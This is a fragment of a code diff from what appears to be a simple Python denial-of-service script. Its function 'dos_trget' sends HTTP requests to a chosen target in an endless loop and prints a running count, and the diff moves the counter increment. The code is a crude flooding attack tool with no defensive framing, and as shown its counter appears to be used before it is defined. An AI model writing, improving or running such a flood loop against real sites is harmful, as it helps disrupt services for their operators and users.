@@ -40,9 +40,9 @@ def clear():
 def dos_trget(target):
 #
     while True:
+        x += 1
         try:
             rves = requests.get(target)
-            x = x + 1
             print(f"Request sented {x} to {target}")
 #
         except requests.exceptions.ConnectionError:
